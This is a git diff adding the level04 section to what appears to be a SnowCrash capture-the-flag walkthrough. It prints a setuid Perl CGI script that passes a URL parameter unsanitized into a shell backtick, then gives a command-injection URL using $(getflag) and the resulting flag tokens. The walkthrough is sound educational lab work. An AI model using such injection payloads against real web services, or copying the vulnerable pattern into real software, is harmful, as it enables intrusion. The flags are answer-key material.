@@ -144,3 +144,36 @@ You can now execute **./level03** and get your token :
 `qi0maab88jeaj46qoumi7maus`
 
 # level04 :
+```sh
+level04@SnowCrash:~$ ls -la
+total 16
+dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
+-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
+-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
+-r-x------  1 level04 level04  675 Apr  3  2012 .profile
+```
+This time we are given a perl script. First off let's read it.
+```perl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+```
+After a bit of digging (if like me you've never used perl) this opens a webpage on **localhost:4747** where the subroutine **x** is executed.
+This one is pretty straightforward simply modify the parameter of x (which is also x for some reason) in order to print the result of the getflag function.
+To do that simply access the website using the following URL :
+```
+http://192.168.56.102:4747/?x="$(getflag)"
+```
+OHHHH MAGIC :
+``ne2searoevaevoem4ov4ar8ap``
+Et voila, on to level05.
+
+# level05 :
